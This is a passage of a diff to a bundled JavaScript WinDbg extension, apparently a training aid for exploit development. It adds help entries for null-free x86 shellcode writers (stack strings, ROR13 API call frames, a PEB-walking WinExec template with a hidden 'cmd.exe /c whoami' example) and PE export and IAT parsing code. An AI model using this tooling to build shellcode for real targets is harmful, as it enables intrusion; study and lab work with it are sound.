@@ -150,8 +150,8 @@ var osed_bundle = (() => {
       if (/^[0-9]+$/.test(trimmed)) {
         throw new Error("Decimal address strings are not allowed.");
       }
-      const hex5 = trimmed.startsWith("0x") ? trimmed : `0x${trimmed}`;
-      return BigInt(hex5);
+      const hex6 = trimmed.startsWith("0x") ? trimmed : `0x${trimmed}`;
+      return BigInt(hex6);
     }
     throw new Error("Address must be a number or hex string.");
   }
@@ -388,13 +388,13 @@ var osed_bundle = (() => {
     if (!/^(0x)?[0-9a-fA-F]+$/.test(value)) {
       throw new Error("String pattern_offset value must be raw hex only.");
     }
-    const hex5 = value.startsWith("0x") ? value.slice(2) : value;
-    if (hex5.length % 2 !== 0) {
+    const hex6 = value.startsWith("0x") ? value.slice(2) : value;
+    if (hex6.length % 2 !== 0) {
       throw new Error("Hex string length must be even.");
     }
     const chars = [];
-    for (let i = 0; i < hex5.length; i += 2) {
-      chars.push(parseInt(hex5.slice(i, i + 2), 16));
+    for (let i = 0; i < hex6.length; i += 2) {
+      chars.push(parseInt(hex6.slice(i, i + 2), 16));
     }
     return String.fromCharCode(...chars.reverse());
   }
@@ -2389,18 +2389,18 @@ var osed_bundle = (() => {
         const expected = expectedBytes(normalizedExclude.values);
         const python = formatByteArray(expected, "python");
         const c = formatByteArray(expected, "c");
-        const hex5 = formatByteArray(expected, "hex");
+        const hex6 = formatByteArray(expected, "hex");
         section("Bad Character Test Array");
         info(`Bytes: ${expected.length} (excluded ${normalizedExclude.values.length})`);
         print(`Python: ${python}`);
         print(`C:      ${c}`);
-        print(`Hex:    ${hex5}`);
+        print(`Hex:    ${hex6}`);
         whyItMatters("Send this array to the target, then use badchar_find to locate it in memory and see which bytes were mangled.");
         const warnings = normalizedExclude.warning ? [normalizedExclude.warning] : [];
         return result(
           "badchar_array",
           __spreadProps(__spreadValues({}, options), { exclude: normalizedExclude.values }),
-          [{ count: expected.length, exclude: normalizedExclude.values, bytes: expected, formats: { python, c, hex: hex5 } }],
+          [{ count: expected.length, exclude: normalizedExclude.values, bytes: expected, formats: { python, c, hex: hex6 } }],
           warnings
         );
       }
@@ -5158,8 +5158,8 @@ var osed_bundle = (() => {
       const scratchSteps = emitGadgetWithSideEffects(scratchPop, `pop ${scratch}`);
       scratchSteps.splice(1, 0, valueStep(decomp.b, `${scratch} = ${hex32(decomp.b)}`));
       steps.push(...scratchSteps);
-      const op4 = mode === "add" ? "add" : "sub";
-      steps.push(...emitGadgetWithSideEffects(binGadget, `${op4} ${reg}, ${scratch} -> ${hex32(value >>> 0)}`));
+      const op5 = mode === "add" ? "add" : "sub";
+      steps.push(...emitGadgetWithSideEffects(binGadget, `${op5} ${reg}, ${scratch} -> ${hex32(value >>> 0)}`));
       const recipe = {
         steps,
         recipe: mode === "add" ? "two-add" : "two-sub",
@@ -7512,8 +7512,8 @@ var osed_bundle = (() => {
     const raw = text.trim().toLowerCase();
     if (/^-?0x[0-9a-f]+$/.test(raw)) {
       const negative = raw.startsWith("-");
-      const hex5 = negative ? raw.slice(3) : raw.slice(2);
-      const parsed = Number.parseInt(hex5, 16);
+      const hex6 = negative ? raw.slice(3) : raw.slice(2);
+      const parsed = Number.parseInt(hex6, 16);
       if (!Number.isFinite(parsed)) {
         return void 0;
       }
@@ -11269,6 +11269,44 @@ var osed_bundle = (() => {
       examples: ['dx @$osed().sc.hash("WinExec", "ROR13")']
     },
     {
+      name: "sc.push_string",
+      description: "Prints x86 instructions that build a NUL-terminated string on the stack. Dwords are pushed last first; the terminator and a partial last dword are built without 00 bytes (xor/push, mov+not, mov+neg, mov+xor or mov+add) and every immediate avoids the given bad characters. Each push shows the 4 characters it holds and its bytes, then the same lines print as a Keystone CODE string.",
+      usage: "dx @$osed().sc.push_string(text, badchars?, register?)",
+      examples: [
+        { label: "ESP points at the string", command: 'dx @$osed().sc.push_string("calc.exe")' },
+        { label: "Spaces are bad chars, keep a pointer in ebx", command: 'dx @$osed().sc.push_string("cmd.exe /c whoami", "00 0A 0D 20", "ebx")' }
+      ],
+      details: "00 is always treated as bad. Encodings use eax, ecx or edx as scratch, so save those first if they hold values you need. Use the register argument to copy ESP right after the pushes, before more pushes move ESP away from the string.",
+      seeAlso: ["sc.call_frame", "sc.template", "str.bytes"],
+      keywords: ["shellcode", "string", "stack", "null-free", "custom shellcode"]
+    },
+    {
+      name: "sc.call_frame",
+      description: "Prints the pushes for one stdcall API call through the sc.template resolver: the arguments in reverse order with one comment each, the ROR13 hash of the export name, the module base slot, call [ebp-0x04] and call eax. Numeric arguments are pushed without 00 or bad bytes; registers, [ebp+n] slots and other expressions are pushed as written.",
+      usage: 'dx @$osed().sc.call_frame(api, args..., "bad=<list>"?)',
+      examples: [
+        { label: "WinExec with a placeholder pointer", command: 'dx @$osed().sc.call_frame("WinExec", "<ptr to cmd>", "1")' },
+        { label: "Exit quietly, avoiding CR and LF", command: 'dx @$osed().sc.call_frame("TerminateProcess", "-1", "0", "bad=00 0A 0D")' }
+      ],
+      details: "Known prototypes (WinExec, ExitProcess, TerminateProcess, LoadLibraryA, GetProcAddress, VirtualAlloc, CreateProcessA, WSAStartup, connect, MessageBoxA and a few more) name each argument and warn about a wrong count. An unknown name still gets its hash, from the exact spelling given. Exports outside kernel32 use the [ebp-0x0c] slot that a LoadLibraryA task fills.",
+      seeAlso: ["sc.template", "sc.hash", "sc.hashresolve"],
+      keywords: ["shellcode", "stdcall", "hash", "ror13", "custom shellcode"]
+    },
+    {
+      name: "sc.template",
+      description: "Prints a complete build_sc.py for custom x86 shellcode. The assembly saves registers, reserves stack without 00 bytes, finds kernel32 through the PEB loader list, stores a ROR13 export resolver, runs one call frame per task, and returns. The Python part assembles with Keystone, prints the size and every bad byte with its offset and line, writes shellcode.bin and prints the bytes as a literal.",
+      usage: 'dx @$osed().sc.template(task..., "bad=<list>"?)',
+      examples: [
+        { label: "calc, then ExitProcess", command: 'dx @$osed().sc.template("winexec=calc.exe", "exit")' },
+        { label: "Hidden command, spaces are bad", command: 'dx @$osed().sc.template("show=0", "winexec=cmd.exe /c whoami", "terminate", "bad=00 0A 0D 20")' },
+        { label: "Load a DLL and resolve an export", command: 'dx @$osed().sc.template("loadlibrary=user32.dll", "getprocaddress=MessageBoxA")' }
+      ],
+      details: "Tasks run in order: winexec=<command line>, loadlibrary=<dll>, getprocaddress=<export>, exit (ExitProcess(0)), terminate (TerminateProcess(-1, 0)). show=<n> sets uCmdShow for later winexec tasks (default 1). Without an exit task the shellcode returns to its caller, which suits a test loader. With no tasks you get winexec=calc.exe and exit. Default output contains no 00 byte; other bad chars in the fixed routines are reported by the script for you to rewrite.",
+      limitations: ["32-bit only. The kernel32 lookup matches the first 12-character module name starting with K in initialization order, which was kernel32.dll on the Windows 10 (19045) and Windows 11 (26200) builds tested."],
+      seeAlso: ["sc.push_string", "sc.call_frame", "sc.hash"],
+      keywords: ["shellcode", "keystone", "peb", "export", "custom shellcode", "build_sc"]
+    },
+    {
       name: "sc.algorithms",
       description: "Lists supported API hash algorithms.",
       usage: "dx @$osed().sc.algorithms()",
@@ -11373,10 +11411,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-19T17:20:44.510Z" : globalThis[key2];
+        value = true ? "2026-11-19T18:38:53.844Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "3621232ad998" : globalThis[key2];
+        value = true ? "02586265353c" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -11577,7 +11615,9 @@ var osed_bundle = (() => {
   }
 
   // src/commands/help.ts
+  var SHELLCODE_WRITERS = ["sc.push_string", "sc.call_frame", "sc.template"];
   var categoryForName = (name) => {
+    if (SHELLCODE_WRITERS.includes(name)) return "shellcode";
     if (name.startsWith("rop") || name === "dep_function" || name === "retn" || name === "add_esp" || name === "pivots") return "rop";
     if (name === "seh" || name === "seh_ppr" || name.startsWith("seh.")) return "seh";
     if (name.startsWith("sc.")) return "pe-api";
@@ -11669,6 +11709,9 @@ var osed_bundle = (() => {
     "sc.peb": "Dump PEB-oriented module evidence",
     "sc.module_pages": "Report module size and page count",
     "sc.page_summary": "Bucket module pages by protection",
+    "sc.push_string": "x86 pushes that build a string on the stack, null-free",
+    "sc.call_frame": "x86 push sequence and ROR13 hash for one API call",
+    "sc.template": "Print a Keystone build_sc.py for custom shellcode",
     "str.find": "Search process memory for strings",
     "str.read": "Read a string from memory",
     "str.refs": "Find executable pointers to a string",
@@ -11708,7 +11751,9 @@ var osed_bundle = (() => {
   function groupedDocuments(registry2) {
     var _a, _b;
     const documents2 = /* @__PURE__ */ new Map();
-    for (const command2 of registry2.getAll()) documents2.set(command2.name, registryDocument(command2));
+    for (const command2 of registry2.getAll()) {
+      if (!command2.name.startsWith("sc_")) documents2.set(command2.name, registryDocument(command2));
+    }
     for (const entry of NAMESPACE_HELP_ENTRIES) documents2.set(entry.name, toDocument(entry));
     documents2.delete("rop");
     documents2.delete("exploit");
@@ -11725,7 +11770,7 @@ var osed_bundle = (() => {
     ["payload", ["pattern_create", "pattern_offset", "badchars"]],
     ["rop", ["rop.scan_live", "rop.api_plan", "rop.api_build", "rop.query", "rop.capabilities", "rop.plan", "rop.generate", "rop.verify", "rop.prove"]],
     ["pe-api", ["sc.iat", "sc.resolve"]],
-    ["shellcode", ["encode", "egghunter"]],
+    ["shellcode", ["encode", "egghunter", "sc.template"]],
     ["seh", ["seh", "seh_ppr"]],
     ["strings", ["str.find"]],
     ["format", ["fmt_build"]]
@@ -11754,6 +11799,7 @@ var osed_bundle = (() => {
     }
     if (name === "sc") {
       if (entry.name.startsWith("sc.iat")) return "imports";
+      if (SHELLCODE_WRITERS.includes(entry.name)) return "shellcode writing";
       if (["sc.exports", "sc.export", "sc.exportat", "sc.exportdir", "sc.exportwalk", "sc.resolve", "sc.hash", "sc.hashes", "sc.hashresolve", "sc.algorithms"].includes(entry.name)) return "api resolution";
       return "pe and modules";
     }
@@ -12667,13 +12713,13 @@ var osed_bundle = (() => {
     if (typeof raw !== "string" || !raw.trim()) {
       throw new Error("shellcode must be a non-empty hex string or byte array.");
     }
-    const hex5 = raw.replace(/[^0-9a-fA-F]/g, "");
-    if (hex5.length % 2 !== 0) {
+    const hex6 = raw.replace(/[^0-9a-fA-F]/g, "");
+    if (hex6.length % 2 !== 0) {
       throw new Error("shellcode hex string must have an even number of hex digits.");
     }
     const result3 = [];
-    for (let i = 0; i < hex5.length; i += 2) {
-      result3.push(parseInt(hex5.slice(i, i + 2), 16));
+    for (let i = 0; i < hex6.length; i += 2) {
+      result3.push(parseInt(hex6.slice(i, i + 2), 16));
     }
     return result3;
   }
@@ -13137,6 +13183,2126 @@ var osed_bundle = (() => {
         section(`${method} Python Call-Frame Skeleton`);
         for (const line of lines) print(line);
         return { command: "dep_function", args: { method }, success: true, findings: [{ method, lines }], warnings: [], errors: [] };
+      }
+    };
+  }
+
+  // src/core/dx_result.ts
+  var DxRow = class {
+    constructor(values) {
+      for (const [key2, value] of Object.entries(values)) {
+        this[key2] = value;
+      }
+    }
+    toString() {
+      const pairs = Object.entries(this).filter(([, value]) => typeof value === "string");
+      return pairs.map(([key2, value]) => `${key2}: ${stripDml(value)}`).join(" | ");
+    }
+  };
+  var DxRows = class {
+    constructor(title, values) {
+      Object.defineProperty(this, "title", {
+        value: title,
+        enumerable: false,
+        configurable: false,
+        writable: false
+      });
+      Object.defineProperty(this, "values", {
+        value: values,
+        enumerable: false,
+        configurable: false,
+        writable: false
+      });
+      this.length = values.length;
+      values.forEach((row, index) => {
+        Object.defineProperty(this, index, {
+          value: row,
+          enumerable: false,
+          configurable: false,
+          writable: false
+        });
+      });
+    }
+    [Symbol.iterator]() {
+      return this.values[Symbol.iterator]();
+    }
+    map(callback) {
+      return this.values.map(callback);
+    }
+    forEach(callback) {
+      this.values.forEach(callback);
+    }
+    slice(start, end) {
+      return this.values.slice(start, end);
+    }
+    toArray() {
+      return [...this.values];
+    }
+    toString() {
+      return `${this.title}: ${this.length} row${this.length === 1 ? "" : "s"}; expand rows[N] for details`;
+    }
+  };
+  var DxResult = class {
+    constructor(title, rows) {
+      this.title = title;
+      this.rows = new DxRows(title, rows.map((row) => new DxRow(row)));
+      this.length = this.rows.length;
+    }
+    toString() {
+      return `${this.title}: ${this.length} row${this.length === 1 ? "" : "s"}`;
+    }
+  };
+  function toDxResult(title, rows) {
+    return new DxResult(title, rows);
+  }
+
+  // src/shellcode/index.ts
+  var MetasploitRor13Provider = class {
+    constructor() {
+      this.algorithm = "metasploit_ror13";
+      this.aliases = ["ror13", "msf_ror13"];
+      this.description = "Classic Metasploit-style API hash: ROR 13 then add byte.";
+    }
+    ror32(value, bits) {
+      const shift = bits & 31;
+      return (value >>> shift | value << 32 - shift) >>> 0;
+    }
+    hash(text) {
+      let hash = 0;
+      for (const byte of asciiBytes(text)) {
+        hash = this.ror32(hash, 13);
+        hash = hash + byte >>> 0;
+      }
+      return hash >>> 0;
+    }
+  };
+  function ror13Hash(name) {
+    return new MetasploitRor13Provider().hash(name);
+  }
+  var HashResolver = class {
+    constructor(providers) {
+      this.defaultAlias = "ror13";
+      var _a;
+      const configured = providers != null ? providers : [
+        new MetasploitRor13Provider(),
+        new Crc32Provider(),
+        new Rol7AddProvider()
+      ];
+      this.canonicalProviders = configured;
+      this.providers = /* @__PURE__ */ new Map();
+      for (const provider of configured) {
+        this.providers.set(provider.algorithm.toLowerCase(), provider);
+        for (const alias of (_a = provider.aliases) != null ? _a : []) {
+          this.providers.set(alias.toLowerCase(), provider);
+        }
+      }
+    }
+    compute(exportsList, algorithm) {
+      const provider = this.resolveProvider(algorithm);
+      if (!provider) {
+        throw new Error(`Unknown hash algorithm "${algorithm}". Supported: ${this.supportedAlgorithms().join(", ")}.`);
+      }
+      const label = this.displayName(provider);
+      return exportsList.filter((entry) => entry.name.length > 0).map((entry) => ({
+        Algorithm: label,
+        Hash: `0x${provider.hash(entry.name).toString(16).toUpperCase().padStart(8, "0")}`,
+        Name: entry.name,
+        Address: toDmlAddress(entry.va, "u")
+      })).sort((a, b) => a.Name.localeCompare(b.Name));
+    }
+    hashValue(text, algorithm) {
+      const provider = this.resolveProvider(algorithm);
+      if (!provider) {
+        throw new Error(`Unknown hash algorithm "${algorithm}". Supported: ${this.supportedAlgorithms().join(", ")}.`);
+      }
+      return {
+        Input: text,
+        Algorithm: this.displayName(provider),
+        Hash: `0x${provider.hash(text).toString(16).toUpperCase().padStart(8, "0")}`
+      };
+    }
+    listAlgorithms() {
+      const defaultProvider = this.resolveProvider(this.defaultAlias);
+      return this.canonicalProviders.map((provider) => {
+        var _a;
+        return {
+          Algorithm: provider.algorithm,
+          Aliases: ((_a = provider.aliases) != null ? _a : []).join(", "),
+          Description: provider.description,
+          Default: provider === defaultProvider ? "yes" : "no"
+        };
+      }).sort((a, b) => a.Algorithm.localeCompare(b.Algorithm));
+    }
+    supportedAlgorithms() {
+      return Array.from(this.providers.keys()).sort();
+    }
+    resolveProvider(algorithm) {
+      const selected = (algorithm != null ? algorithm : this.defaultAlias).trim().toLowerCase();
+      return this.providers.get(selected);
+    }
+    displayName(provider) {
+      return provider.aliases && provider.aliases.length > 0 ? provider.aliases[0].toUpperCase() : provider.algorithm;
+    }
+  };
+  var Crc32Provider = class {
+    constructor() {
+      this.algorithm = "crc32";
+      this.description = "CRC32 (IEEE polynomial 0xEDB88320) over ASCII bytes.";
+      this.table = this.buildTable();
+    }
+    hash(text) {
+      let crc = 4294967295;
+      for (const byte of asciiBytes(text)) {
+        const index = (crc ^ byte) & 255;
+        crc = crc >>> 8 ^ this.table[index];
+      }
+      return (crc ^ 4294967295) >>> 0;
+    }
+    buildTable() {
+      const table2 = [];
+      for (let i = 0; i < 256; i += 1) {
+        let value = i;
+        for (let bit = 0; bit < 8; bit += 1) {
+          if ((value & 1) === 1) {
+            value = value >>> 1 ^ 3988292384;
+          } else {
+            value >>>= 1;
+          }
+        }
+        table2.push(value >>> 0);
+      }
+      return table2;
+    }
+  };
+  var Rol7AddProvider = class {
+    constructor() {
+      this.algorithm = "rol7_add";
+      this.aliases = ["rol7"];
+      this.description = "Rotate-left by 7 then add byte (32-bit accumulator).";
+    }
+    rol32(value, bits) {
+      const shift = bits & 31;
+      return (value << shift | value >>> 32 - shift) >>> 0;
+    }
+    hash(text) {
+      let hash = 0;
+      for (const byte of asciiBytes(text)) {
+        hash = this.rol32(hash, 7);
+        hash = hash + byte >>> 0;
+      }
+      return hash >>> 0;
+    }
+  };
+  function asciiBytes(text) {
+    const bytes = [];
+    for (let i = 0; i < text.length; i += 1) {
+      const code = text.charCodeAt(i);
+      if (code > 127) {
+        throw new Error("Hash input must be ASCII for shellforge parity.");
+      }
+      bytes.push(code & 255);
+    }
+    return bytes;
+  }
+  var PEParser = class {
+    constructor(pointerSize) {
+      this.pointerSize = pointerSize;
+    }
+    parseHeaders(module) {
+      const base = module.base;
+      const mz = readUint16LE(base);
+      if (mz !== 23117) {
+        throw new Error(`Invalid DOS header for ${module.name}.`);
+      }
+      const eLfanew = readUint32LE(base + BigInt(60));
+      const ntHeader = base + BigInt(eLfanew);
+      const signature = readUint32LE(ntHeader);
+      if (signature !== 17744) {
+        throw new Error(`Invalid NT header signature for ${module.name}.`);
+      }
+      const machine = readUint16LE(ntHeader + BigInt(4));
+      let timeDateStamp = 0;
+      try {
+        timeDateStamp = readUint32LE(ntHeader + BigInt(8));
+      } catch (_error) {
+      }
+      const optionalHeader = ntHeader + BigInt(24);
+      const optionalHeaderMagic = readUint16LE(optionalHeader);
+      const isPe32Plus = optionalHeaderMagic === 523;
+      if (!isPe32Plus && optionalHeaderMagic !== 267) {
+        throw new Error(`Unsupported optional header magic 0x${optionalHeaderMagic.toString(16)}.`);
+      }
+      const entryPointRva = readUint32LE(optionalHeader + BigInt(16));
+      const imageBase = isPe32Plus ? readPointer(optionalHeader + BigInt(24), 8) : BigInt(readUint32LE(optionalHeader + BigInt(28)));
+      const sizeOfImage = readUint32LE(optionalHeader + BigInt(56));
+      const dataDirectoryOffset = optionalHeader + BigInt(isPe32Plus ? 112 : 96);
+      const exportDirectoryRva = readUint32LE(dataDirectoryOffset);
+      const exportDirectorySize = readUint32LE(dataDirectoryOffset + BigInt(4));
+      return {
+        dosHeader: base,
+        eLfanew,
+        ntHeader,
+        machine,
+        machineName: machineToString(machine),
+        timeDateStamp,
+        entryPointRva,
+        entryPointVa: base + BigInt(entryPointRva),
+        imageBase,
+        sizeOfImage,
+        optionalHeaderMagic,
+        exportDirectoryRva,
+        exportDirectoryVa: base + BigInt(exportDirectoryRva),
+        exportDirectorySize
+      };
+    }
+    parseExports(module) {
+      var _a;
+      const exportInfo = this.parseExportDirectory(module);
+      if (!exportInfo) {
+        return [];
+      }
+      if (exportInfo.numberOfFunctions === 0 || exportInfo.addressOfFunctionsRva === 0) {
+        return [];
+      }
+      const functionsVa = module.base + BigInt(exportInfo.addressOfFunctionsRva);
+      const namesVa = module.base + BigInt(exportInfo.addressOfNamesRva);
+      const ordinalsVa = module.base + BigInt(exportInfo.addressOfNameOrdinalsRva);
+      const namesByIndex = /* @__PURE__ */ new Map();
+      for (let i = 0; i < exportInfo.numberOfNames; i += 1) {
+        const nameRva = readUint32LE(namesVa + BigInt(i * 4));
+        const ordinalIndex = readUint16LE(ordinalsVa + BigInt(i * 2));
+        const nameAddress = module.base + BigInt(nameRva);
+        namesByIndex.set(ordinalIndex, readAsciiString(nameAddress, 512));
+      }
+      const entries = [];
+      for (let index = 0; index < exportInfo.numberOfFunctions; index += 1) {
+        const rva = readUint32LE(functionsVa + BigInt(index * 4));
+        const va = module.base + BigInt(rva);
+        const ordinal = exportInfo.ordinalBase + index;
+        entries.push({
+          ordinal,
+          rva,
+          va,
+          name: (_a = namesByIndex.get(index)) != null ? _a : ""
+        });
+      }
+      return entries;
+    }
+    formatHeaderRows(module) {
+      const headers = this.parseHeaders(module);
+      return [
+        { Field: "Base", Value: toDmlAddress(module.base, "db") },
+        { Field: "DOS Header", Value: toDmlAddress(headers.dosHeader, "db") },
+        { Field: "e_lfanew", Value: `0x${headers.eLfanew.toString(16).toUpperCase()}` },
+        { Field: "NT Header", Value: toDmlAddress(headers.ntHeader, "db") },
+        { Field: "Machine", Value: `${headers.machineName} (0x${headers.machine.toString(16).toUpperCase()})` },
+        { Field: "EntryPoint", Value: `${toDmlAddress(headers.entryPointVa, "u")} (RVA 0x${headers.entryPointRva.toString(16).toUpperCase()})` },
+        { Field: "ImageBase", Value: formatAddress(headers.imageBase, this.pointerSize) },
+        { Field: "SizeOfImage", Value: `0x${headers.sizeOfImage.toString(16).toUpperCase()}` },
+        { Field: "ExportDir RVA", Value: `0x${headers.exportDirectoryRva.toString(16).toUpperCase()}` },
+        { Field: "ExportDir VA", Value: toDmlAddress(headers.exportDirectoryVa, "db") }
+      ];
+    }
+    parseExportDirectory(module) {
+      const headers = this.parseHeaders(module);
+      if (headers.exportDirectoryRva === 0 || headers.exportDirectorySize === 0) {
+        return void 0;
+      }
+      const exportDir = module.base + BigInt(headers.exportDirectoryRva);
+      return {
+        exportDirectoryRva: headers.exportDirectoryRva,
+        exportDirectoryVa: headers.exportDirectoryVa,
+        exportDirectorySize: headers.exportDirectorySize,
+        ordinalBase: readUint32LE(exportDir + BigInt(16)),
+        numberOfFunctions: readUint32LE(exportDir + BigInt(20)),
+        numberOfNames: readUint32LE(exportDir + BigInt(24)),
+        addressOfFunctionsRva: readUint32LE(exportDir + BigInt(28)),
+        addressOfNamesRva: readUint32LE(exportDir + BigInt(32)),
+        addressOfNameOrdinalsRva: readUint32LE(exportDir + BigInt(36))
+      };
+    }
+  };
+  var ExportResolver = class {
+    constructor(parser) {
+      // parseExports reads the module's whole export table (many string reads). It is
+      // called per import entry by nearestSymbol during iat_find, so without a cache
+      // an all-modules scan re-reads kernel32/kernelbase exports tens of thousands of
+      // times — minutes to hours. Cache per module base (a rebase changes the key).
+      this.exportCache = /* @__PURE__ */ new Map();
+      this.parser = parser;
+    }
+    cachedExports(module) {
+      const key2 = module.base.toString();
+      let cached = this.exportCache.get(key2);
+      if (!cached) {
+        cached = this.parser.parseExports(module);
+        this.exportCache.set(key2, cached);
+      }
+      return cached;
+    }
+    enumerate(module, filter) {
+      const entries = this.cachedExports(module);
+      const needle = normalizeNeedle(filter);
+      return entries.filter((entry) => {
+        if (!needle) {
+          return true;
+        }
+        return entry.name.toLowerCase().includes(needle);
+      }).sort((a, b) => {
+        const left = a.name || `~${a.ordinal.toString(16)}`;
+        const right = b.name || `~${b.ordinal.toString(16)}`;
+        return left.localeCompare(right);
+      }).map((entry) => ({
+        Ordinal: entry.ordinal.toString(),
+        RVA: `0x${entry.rva.toString(16).toUpperCase().padStart(8, "0")}`,
+        VA: toDmlAddress(entry.va, "u"),
+        Name: entry.name || "<unnamed>"
+      }));
+    }
+    resolve(module, symbol) {
+      const needle = symbol.trim().toLowerCase();
+      if (!needle) {
+        return void 0;
+      }
+      return this.cachedExports(module).find((entry) => entry.name.toLowerCase() === needle);
+    }
+    getExports(module) {
+      return this.cachedExports(module);
+    }
+    getExportDirectory(module) {
+      return this.parser.parseExportDirectory(module);
+    }
+    findByOrdinalIndex(module, ordinalIndex) {
+      if (ordinalIndex < 0) {
+        return void 0;
+      }
+      const exportDir = this.parser.parseExportDirectory(module);
+      if (!exportDir) {
+        return void 0;
+      }
+      const targetOrdinal = exportDir.ordinalBase + ordinalIndex;
+      return this.cachedExports(module).find((entry) => entry.ordinal === targetOrdinal);
+    }
+    isForwarded(module, entry) {
+      const exportDir = this.parser.parseExportDirectory(module);
+      if (!exportDir) {
+        return { forwarded: false, target: "" };
+      }
+      const start = exportDir.exportDirectoryRva;
+      const end = start + exportDir.exportDirectorySize;
+      if (entry.rva >= start && entry.rva < end) {
+        return {
+          forwarded: true,
+          target: readAsciiString(module.base + BigInt(entry.rva), 512)
+        };
+      }
+      return { forwarded: false, target: "" };
+    }
+    nearestSymbol(module, address) {
+      const exportsList = this.cachedExports(module).filter((entry) => entry.name.length > 0).sort((a, b) => a.va < b.va ? -1 : 1);
+      let nearest;
+      for (const entry of exportsList) {
+        if (entry.va > address) {
+          break;
+        }
+        nearest = entry;
+      }
+      if (!nearest) {
+        return void 0;
+      }
+      return { name: nearest.name, offset: address - nearest.va };
+    }
+  };
+  var IATResolver = class {
+    constructor(pointerSize, parser, exportResolver, modulesProvider) {
+      this.pointerSize = pointerSize;
+      this.parser = parser;
+      this.exportResolver = exportResolver;
+      this.modulesProvider = modulesProvider;
+    }
+    enumerateIat(owner) {
+      const headers = this.parser.parseHeaders(owner);
+      const importDirRva = this.readImportDirectoryRva(owner, headers.optionalHeaderMagic, headers.ntHeader);
+      if (importDirRva === 0) {
+        return [];
+      }
+      const modules = this.modulesProvider();
+      const rows = [];
+      const descriptors = this.readImportDescriptors(owner, importDirRva);
+      const firstThunkBounds = descriptors.map((descriptor) => descriptor.firstThunk).filter((rva) => rva > 0).sort((left, right) => left - right);
+      for (const descriptor of descriptors) {
+        const { originalFirstThunk, nameRva, firstThunk } = descriptor;
+        const nextFirstThunk = firstThunkBounds.find((rva) => rva > firstThunk);
+        const iatEnd = nextFirstThunk ? owner.base + BigInt(nextFirstThunk) : void 0;
+        if (firstThunk === 0) {
+          continue;
+        }
+        const dllName = nameRva === 0 ? "<unknown>" : readAsciiString(owner.base + BigInt(nameRva), 260);
+        const expectedModule = this.findByDllName(modules, dllName);
+        const intBaseRva = originalFirstThunk !== 0 ? originalFirstThunk : firstThunk;
+        let intPtr = owner.base + BigInt(intBaseRva);
+        let iatPtr = owner.base + BigInt(firstThunk);
+        const maxThunks = 16384;
+        for (let thunkIndex = 0; thunkIndex < maxThunks; thunkIndex += 1) {
+          if (iatEnd !== void 0 && iatPtr >= iatEnd) {
+            break;
+          }
+          const intValue = this.readThunk(intPtr);
+          const iatValue = this.readThunk(iatPtr);
+          if (intValue === BigInt(0) && iatValue === BigInt(0)) {
+            break;
+          }
+          const target = iatValue;
+          const actualModule = this.findContainingModule(modules, target);
+          const nearest = actualModule ? this.exportResolver.nearestSymbol(actualModule, target) : void 0;
+          const imported = this.parseImportedName(owner, intValue);
+          rows.push({
+            ownerModule: owner.name,
+            importDll: dllName,
+            symbol: this.displayImportedSymbol(imported, nearest, expectedModule, actualModule),
+            ordinal: imported.ordinal,
+            nameWarning: imported.warning,
+            slot: iatPtr,
+            target,
+            expectedModule,
+            actualModule,
+            nearest,
+            status: this.classifyStatus(target, expectedModule, actualModule)
+          });
+          intPtr += BigInt(this.pointerSize);
+          iatPtr += BigInt(this.pointerSize);
+        }
+      }
+      return rows;
+    }
+    readImportDescriptors(owner, importDirRva) {
+      const descriptors = [];
+      let descriptorAddress = owner.base + BigInt(importDirRva);
+      const maxDescriptors = 4096;
+      for (let index = 0; index < maxDescriptors; index += 1) {
+        const originalFirstThunk = readUint32LE(descriptorAddress);
+        const _timeDateStamp = readUint32LE(descriptorAddress + BigInt(4));
+        const _forwarderChain = readUint32LE(descriptorAddress + BigInt(8));
+        const nameRva = readUint32LE(descriptorAddress + BigInt(12));
+        const firstThunk = readUint32LE(descriptorAddress + BigInt(16));
+        if (originalFirstThunk === 0 && nameRva === 0 && firstThunk === 0) {
+          break;
+        }
+        descriptors.push({ originalFirstThunk, nameRva, firstThunk, descriptorAddress });
+        descriptorAddress += BigInt(20);
+      }
+      return descriptors;
+    }
+    classifyStatus(target, expected, actual) {
+      if (target === BigInt(0)) {
+        return "unresolved";
+      }
+      if (!this.isMapped(target)) {
+        return "unmapped";
+      }
+      if (!actual) {
+        return "unknown-module";
+      }
+      if (!this.isExecutable(actual, target)) {
+        return "non-exec";
+      }
+      if (expected && expected.name.toLowerCase() !== actual.name.toLowerCase()) {
+        return "outside-module";
+      }
+      return "ok";
+    }
+    isMapped(address) {
+      if (address === BigInt(0)) {
+        return false;
+      }
+      try {
+        readMemory(address, 1);
+        return true;
+      } catch (_error) {
+        return false;
+      }
+    }
+    isExecutable(module, address) {
+      try {
+        const headers = this.parser.parseHeaders(module);
+        const numberOfSections = readUint16LE(headers.ntHeader + BigInt(6));
+        const sizeOfOptionalHeader = readUint16LE(headers.ntHeader + BigInt(20));
+        let sectionHeader = headers.ntHeader + BigInt(24 + sizeOfOptionalHeader);
+        const rva = address - module.base;
+        const IMAGE_SCN_MEM_EXECUTE2 = 536870912;
+        for (let i = 0; i < numberOfSections; i += 1) {
+          const virtualSize = readUint32LE(sectionHeader + BigInt(8));
+          const virtualAddress = readUint32LE(sectionHeader + BigInt(12));
+          const characteristics = readUint32LE(sectionHeader + BigInt(36));
+          const start = BigInt(virtualAddress);
+          const end = start + BigInt(Math.max(virtualSize, 1));
+          if (rva >= start && rva < end) {
+            return (characteristics & IMAGE_SCN_MEM_EXECUTE2) !== 0;
+          }
+          sectionHeader += BigInt(40);
+        }
+      } catch (_error) {
+        return false;
+      }
+      return false;
+    }
+    readImportDirectoryRva(owner, optionalMagic, ntHeader) {
+      const optionalHeader = ntHeader + BigInt(24);
+      const dataDirectoryOffset = optionalHeader + BigInt(optionalMagic === 523 ? 112 : 96);
+      try {
+        return readUint32LE(dataDirectoryOffset + BigInt(8));
+      } catch (_error) {
+        return 0;
+      }
+    }
+    findContainingModule(modules, address) {
+      return modules.find((module) => address >= module.base && address < module.end);
+    }
+    findByDllName(modules, name) {
+      const needle = name.trim().toLowerCase();
+      if (!needle) {
+        return void 0;
+      }
+      const noExt = needle.endsWith(".dll") ? needle.slice(0, -4) : needle;
+      return modules.find((module) => {
+        const lower = module.name.toLowerCase();
+        const lowerNoExt = lower.endsWith(".dll") ? lower.slice(0, -4) : lower;
